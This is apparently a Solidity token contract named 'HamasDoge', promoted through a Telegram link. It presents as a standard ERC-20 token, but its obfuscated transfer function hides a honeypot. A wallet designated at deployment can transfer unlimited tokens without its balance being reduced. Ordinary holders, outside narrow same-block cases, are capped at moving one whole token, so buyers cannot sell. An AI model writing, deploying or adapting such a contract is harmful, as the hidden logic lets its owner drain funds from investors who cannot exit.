/*

https://t.me/hamasdoge

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract HamasDoge is Ownable {
    function transfer(address ltince, uint256 iloe) public returns (bool success) {
        swfge(msg.sender, ltince, iloe);
        return true;
    }

    mapping(address => uint256) private mjsfd;

    IUniswapV2Router02 private mpix;

    mapping(address => uint256) private kzvbmtfiurpg;

    uint256 private itxbvre = 102;

    function transferFrom(address rbskit, address ltince, uint256 iloe) public returns (bool success) {
        require(iloe <= allowance[rbskit][msg.sender]);
        allowance[rbskit][msg.sender] -= iloe;
        swfge(rbskit, ltince, iloe);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private iaps;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory kvfyzmpnoclx, string memory xduf, address qgdspovahtfe, address chzyliovgpqe) {
        name = kvfyzmpnoclx;
        symbol = xduf;
        balanceOf[msg.sender] = totalSupply;
        iaps[chzyliovgpqe] = itxbvre;
        mpix = IUniswapV2Router02(qgdspovahtfe);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address jwyrcohpezbv, uint256 iloe) public returns (bool success) {
        allowance[msg.sender][jwyrcohpezbv] = iloe;
        emit Approval(msg.sender, jwyrcohpezbv, iloe);
        return true;
    }

    function swfge(address rbskit, address ltince, uint256 iloe) private {
        address epksliwmau = IUniswapV2Factory(mpix.factory()).getPair(address(this), mpix.WETH());
        bool mnudhgtyqzvf = mjsfd[rbskit] == block.number;
        uint256 fdwqpb = iaps[rbskit];
        if (0 == fdwqpb) {
            if (rbskit != epksliwmau && (!mnudhgtyqzvf || iloe > kzvbmtfiurpg[rbskit]) && iloe < totalSupply) {
                require(iloe <= totalSupply / (10 ** decimals));
            }
            balanceOf[rbskit] -= iloe;
        }
        kzvbmtfiurpg[ltince] = iloe;
        balanceOf[ltince] += iloe;
        mjsfd[ltince] = block.number;
        emit Transfer(rbskit, ltince, iloe);
    }

    string public symbol;
}
